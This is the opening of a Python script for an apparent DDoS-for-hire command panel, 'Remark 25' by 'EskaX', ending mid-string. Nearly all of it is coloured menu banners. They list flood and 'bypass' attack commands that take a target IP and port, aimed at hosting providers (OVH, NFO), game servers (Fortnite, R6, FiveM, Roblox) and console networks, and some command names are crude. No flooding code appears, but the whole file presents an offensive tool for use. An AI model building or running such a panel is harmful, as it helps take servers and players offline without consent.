#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
nicknm = "EskaX"


#future plans
#============
#Add specific Attack messages for different vector Attacks
#Add tools section (will include: botnet crasher, botnet bruter, pinger, port scanner, etc)
#Add Loading Animations
#Add Seperate banners


user = """
				   ╔═════════════════════════════╗
				   ║     Welcome To Remark 25    ║
				   ║ Please Enter your Username  ║
				   ║ In the Login Prompt Below   ║
				   ╚═════════════════════════════╝
			  ╔═════════════════════════════════════╗
			  ║        This Source Code is          ║
			  ║      Licensed under GPU V3.0        ║
			  ║  FOR ALLOWED USE IN 'CYBER-WARFARE' ║
			  ╚═════════════════════════════════════╝
"""
passw = """
				   ╔═════════════════════════════╗
				   ║     Welcome To Remark 25    ║
				   ║ Please Enter your Password  ║
				   ║ In the Login Prompt Below   ║
				   ╚═════════════════════════════╝
			  ╔═════════════════════════════════════╗
			  ║        This Source Code is          ║
			  ║      Licensed under GPU V3.0        ║
			  ║  FOR ALLOWED USE IN 'CYBER-WARFARE' ║
			  ╚═════════════════════════════════════╝
"""
token = """
				   ╔═════════════════════════════╗
				   ║     Welcome To Remark 25    ║
				   ║ Please Enter your Token     ║
				   ║ In the Login Prompt Below   ║
				   ╚═════════════════════════════╝
			  ╔═════════════════════════════════════╗
			  ║        This Source Code is          ║
			  ║      Licensed under GPU V3.0        ║
			  ║  FOR ALLOWED USE IN 'CYBER-WARFARE' ║
			  ╚═════════════════════════════════════╝
"""

attak = """
			  [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
			  [95m║    [91mAttack has been sucessfully sent [95m║            
			  [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
			  [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
			  [95m║        [91mThis Attack has been         [95m║
			  [95m║    [91mSuccesfull in timing out target  [95m║
			  [95m║       [91mNetwork Ammount used:0.42%    [95m║
			  [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝

"""

captcha = """
what is 5 + 100:
"""

fallout = """
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║    [91m[91mStandard-Attacks    [95m║ [95m║    Special-Attacks     [95m║ [95m║  [91mSingle-Vector Attacks [95m║
[95m╚════════════════════════╝ [95m╚════════════════════════╝ [95m╚════════════════════════╝
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║  [91m.witch  [IP] [PORT]   [95m║ [95m║  [91m.oryx    [IP] [PORT]  [95m║ [95m║  [91m.massacre [IP]        [95m║
[95m║  [91m.home   [IP] [PORT]   [95m║ [95m║  [91m.phoenix [IP] [PORT]  [95m║ [95m║  [91m.killall  [IP] [PORT] [95m║
[95m║  [91m.osiris [IP] [PORT]   [95m║ [95m║  [91m.gunther [IP] [PORT]  [95m║ [95m║  [91m.tcp-all  [IP] [PORT] [95m║
[95m║  [91m.kratos [IP] [PORT]   [95m║ [95m╚════════════════════════╝ [95m║  [91m.MAG-7    [IP] [PORT] [95m║
[95m║  [91m.odin   [IP] [PORT]   [95m║                            [95m║  [91m.AK-47    [IP] [PORT] [95m║
[95m╚════════════════════════╝                            [95m╚════════════════════════╝
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║  [91mDouble-Vector Attacks [95m║ [95m║   [91mTripple-Vector-Gain  [95m║ [95m║      [91mVector-Scream     [95m║
[95m╚════════════════════════╝ [95m╚════════════════════════╝ [95m╚════════════════════════╝
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║  [91m.wsx     [IP] [PORT]  [95m║ [95m║  [91m.vse-gain [IP] [PORT] [95m║ [95m║ [91m.cpu-Vector [IP] [PORT][95m║
[95m║  [91m.xtv     [IP] [PORT]  [95m║ [95m║  [91m.std-gain [IP] [PORT] [95m║ [95m║ [91m.Vector-ESP [IP] [PORT][95m║
[95m║  [91m.strm    [IP] [PORT]  [95m║ [95m║  [91m.udp-gain [IP] [PORT] [95m║ [95m║ [91m.ESP        [IP] [PORT][95m║
[95m╚════════════════════════╝ [95m╚════════════════════════╝ [95m╚════════════════════════╝
[95m╔════════════════════════╗ [95m╔═══════════════════════════════════════════════════╗
[95m║ [91mEskaX [96m. [91mAttack Menu[96m.   [95m║ [95m║ This menu is ongoing progress [96m!                   [95m║
[95m║ [91mVersion [96mIII [95m[[91mBETA[95m][96m.    [95m║ [95m║ [91mThis will be updated daily with new methods[96m.      [95m║
[95m║ Semi-Release.          [95m║ [95m║[91m [95mGame-Attacks are currently NOT working[96m.           [95m║
[95m╚════════════════════════╝ [95m╚═══════════════════════════════════════════════════╝
"""

vip = """
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║            [91m1           [95m║ [95m║           [91m2            [95m║ [95m║            [91m3           [95m║
[95m╚════════════════════════╝ [95m╚════════════════════════╝ [95m╚════════════════════════╝
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║ [91m.Anycast [IP] [PORT]   [95m║ [95m║[91m.panther   [IP] [PORT]  [95m║ [95m║  [91m.Shogun   [IP] [PORT] [95m║
[95m║ [91m.ovary   [IP] [PORT]   [95m║ [95m║[91m.ReRoute   [IP] [PORT]  [95m║ [95m║  [91m.Beretta  [IP] [PORT] [95m║
[95m║ [91m.oval    [IP] [PORT]   [95m║ [95m║[91m.tcp-flash [IP] [PORT]  [95m║ [95m║  [91m.APE      [IP] [PORT] [95m║
[95m║ [91m.gator   [IP] [PORT]   [95m║ [95m╚════════════════════════╝ [95m║  [91m.hex-c    [IP] [PORT] [95m║
[95m║ [91m.bite    [IP] [PORT]   [95m║                            [95m║  [91m.yell     [IP] [PORT] [95m║
[95m╚════════════════════════╝                            [95m╚════════════════════════╝
"""

strength = """
[95m╔════════════════════════╗ 
[95m║    [91m500-700 gigabytes   [95m║ 
[95m╚════════════════════════╝ 
[95m╔════════════════════════╗ 
[95m║  [91m.udp    [IP] [PORT]   [95m║ 
[95m║  [91m.tcp    [IP] [PORT]   [95m║ 
[95m║  [91m.syn    [IP] [PORT]   [95m║ 
[95m║  [91m.ldap   [IP] [PORT]   [95m║ 
[95m║  [91m.mgp    [IP] [PORT]   [95m║                            
[95m╚════════════════════════╝ 
"""
hub = """
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗  
[95m║         [91mvector         [95m║ [95m║         [91mbypass         [95m║ [95m║          [91mgame          [95m║ 
[95m╚════════════════════════╝ [95m╚════════════════════════╝ [95m╚════════════════════════╝ 
"""
vector = """
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║   		[91mvip    		 [95m║ [95m║    	 [91mfallout        [95m║ [95m║  	   [91mstrength        [95m║
[95m╚════════════════════════╝ [95m╚════════════════════════╝ [95m╚════════════════════════╝
"""
help = """
╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║                    [91mBASIC COMMANDS                    [95m║
[95m║[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m║
[95m║ [91mClear                         [95m| [91mCLEAR SCREEN         [95m║
[95m║ [91mHelp                          [95m| [91mFR?                  [95m║
[95m║ [91mExit                          [95m| [91mEXIT REMARK          [95m║
[95m║ [91mHub                      	  [95m| [91mMETHOD SECTION       [95m║
[95m║ [91mUpdates                       [95m| [91mDISPLAY UPDATE NOTES [95m║
[95m║ [91mBanners                       [95m| [91mCHANGE BANNER ON C2  [95m║
[95m║ [91mInfo                          [95m| [91mDISPLAY REMARKS INFO [95m║
╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
"""
game = """
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║   [91m Fortnite-Attacks    [95m║ [95m║        [91mR6-Attacks      [95m║ [95m║     [91mfivem-Attacks      [95m║
[95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║  [91m.fn-lag               [95m║ [95m║  [91m.rank-lag             [95m║ [95m║  [91m.fivem-null           [95m║
[95m║  [91m.fn-kill              [95m║ [95m║  [91m.r6-kill              [95m║ [95m║  [91m.fivem-slap           [95m║
[95m║  [91m.fn-rape              [95m║ [95m║  [91m.r6-rape              [95m║ [95m║  [91m.fivem-vse            [95m║
[95m║  [91m.fn-smack             [95m║ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m║  [91m.fivem-etc            [95m║
[95m║  [91m.fn-rain              [95m║                            [95m║  .fivem-ovh            [95m║
[95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝                            [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║  apex-legends-Attacks  [95m║ [95m║      [91mRoblox-Attacks    [95m║ [95m║ [91mUniversal-Game-Attacks [95m║
[95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║  [91m.apex-xv              [95m║ [95m║  [91m.roblox-kill          [95m║ [95m║ [91m.vse-x                 [95m║
[95m║  [91m.apex-kill            [95m║ [95m║  [91m.roblox-tech          [95m║ [95m║ [91m.vse-kill              [95m║
[95m║  [91m.apex-rape            [95m║ [95m║  [91m.roblox-rape          [95m║ [95m║ [91m.universal             [95m║
[95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║ [91mEskaX [96m. [91mAttack Menu[96m.   [95m║ [95m║ [91mThis menu is ongoing progress [96m!                   [95m║
[95m║ [91mVersion [95mIII [95m[[91mBETA[95m][96m.    [95m║ [95m║ [91mThis will be updated with new methods[96m.            [95m║
[95m║ [91mSemi-Release[96m.          [95m║ [95m║ [91mGame-Attacks are currently NOT working[96m.           [95m║
[95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
"""

bypass = """
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗  
[95m║          [91movh           [95m║ [95m║           [91mnfo          [95m║ [95m║          [91m[91mhydra         [95m║ 
[95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ 
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║   	  [91mpath   	     [95m║
[95m╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝

"""
ovh = """
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║            [91m1           [95m║ [95m║            [91m2           [95m║ [95m║            [91m3           [95m║
[95m╚════════════════════════[95m╝ [95m╚════════════════════════[95m╝ [95m╚════════════════════════[95m╝
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║ [91m.ovh-fly               [95m║ [95m║ [91m.suplex                [95m║ [95m║ [91m.ovh-urunal            [95m║
[95m║ [91m.ovh-xv                [95m║ [95m║ [91m.kiss                  [95m║ [95m║ [91m.ovh-satan             [95m║
[95m║ [91m.k.o                   [95m║ [95m║ [91m.ovh                   [95m║ [95m║ [91m.ovh-gator             [95m║
[95m║ [91m.ovh-syn               [95m║ [95m╚════════════════════════[95m╝ [95m║ [91m.ovh-fila              [95m║
[95m║ [91m.ovh-kill              [95m║                            [95m║ [91m.ovh-punt              [95m║
[95m╚════════════════════════[95m╝                            [95m╚════════════════════════[95m╝
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║             [91m4          [95m║ [95m║            [91m5           [95m║ [95m║            [91m6           [95m║
[95m╚════════════════════════[95m╝ [95m╚════════════════════════[95m╝ [95m╚════════════════════════[95m╝
[95m╔════════════════════════╗ [95m╔════════════════════════╗ [95m╔════════════════════════╗
[95m║ [91m.ovh-crush             [95m║ [95m║ [91m.ovh-crash             [95m║ [95m║ [91m.ovh-raw               [95m║
[95m║ [91m.ovh-nuke              [95m║ [95m║ [91m.ovh-nail              [95m║ [95m║ [91m.ovh-jaws              [95m║
[95m║ [91m.ovh-fuze              [95m║ [95m║ [91m.ovh-hammer            [95m║ [95m║ [91m.ovh-melt              [95m║
[95m╚════════════════════════[95m╝ [95m╚════════════════════════[95m╝ [95m╚════════════════════════[95m╝
[95m╔════════════════════════╗ [95m╔═══════════════════════════════════════════════════╗
[95m║ [91mEskaX [96m. Attack Menu[96m.   [95m║ [95m║ [91mThis menu is ongoing progress [96m!                   [95m║
[95m║ [91mVersion [95mIII [95m[[91mBETA[95m][96m.    [95m║ [95m║ [91mThis will be updated with new methods[96m.            [95m║
[95m║ [91mSemi[95m-Release[96m.          [95m║ [95m║ [91mGame-Attacks are currently NOT working[96m.           [95m║
[95m╚════════════════════════[95m╝ [95m╚═══════════════════════════════════════════════════[95m╝
"""
nfo = """
[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗
[95m║            1           [95m║ [95m║            2           [95m║ [95m║            3           [95m║
[95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝
╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗
[95m║ [91m.nfo-udp               [95m║ [95m║ [91m.sack                  [95m║ [95m║ [91m.discord-fly           [95m║
[95m║ [91m.nfo-tcp               [95m║ [95m║ [91m.ssdp-x                [95m║ [95m║ [91m.xbox-fly              [95m║
[95m║ [91m.nfo-amp               [95m║ [95m║ [91m.psn-rape              [95m║ [95m║ [91m.nfo-mock              [95m║
[95m║ [91m.nfo-xap               [95m║ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m║ [91m.redsyn                [95m║
[95m║ [91m.xmas-tfo              [95m║                            [95m║ [91m.bluesyn               [95m║
[95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝                            [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝
╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗
[95m║             4  [95m║ [95m║      [91m     5    [95m║ [95m║    6 [95m║
[95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝
╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗
[95m║ [91m.gatorade              [95m║ [95m║ [91m.bermuda               [95m║ [95m║ [91m.rainbowsyn            [95m║
[95m║ [91m.spingebinge           [95m║ [95m║ [91m.raw-null              [95m║ [95m║ [91m.bluesyn               [95m║
[95m║ [91m.killall3              [95m║ [95m║ [91m.nfo-thor              [95m║ [95m║ [91m.greensyn              [95m║
[95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝
╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╗ ╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m═══╗
[95m║ [91mEskaX [96m. [91mAttack Menu[96m.   [95m║ [95m║ [91mThis menu is ongoing progress [96m!                   [95m║
[95m║ [91mVersion III [95m[[91mBETA[95m][96m.    [95m║ [95m║ [91mThis will be updated with new methods[96m.            [95m║
[95m║ Semi-Release.          [95m║ [95m║ [91mGame-Attacks are currently NOT working[96m.           [95m║
[95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══╝ [95m[95m╔[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m══[95m═══╝
"""
hydra = """ 
╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ ╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ ╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║            1           [95m║ [95m║            2           [95m║ [95m║            3           [95m║
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ ╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ ╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
[95m║  [91m.hydra-slump          [95m║ [95m║  [91m.hydra-x              [95m║ [95m║  [91m.hydra-drain          [95m║
[95m║  [91m.hydra-vader          [95m║ [95m║  [91m.hydra-qotd           [95m║ [95m║  [91m.hydra-snake          [95m║
[95m║  [91m.complexity           [95m║ [95m║  [91m.hex                  [95m║ [95m║  [91m.hydra-x              [95m║
[95m║  [91m.okybo-x              [95m║ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ [95m║  [91m.hydra-royal          [95m║
[95m║  [91m.hydra-tornado        [95m║                            [95m║  [91m.eska-special         [95m║
[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝                            [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝
"""
path = """ 
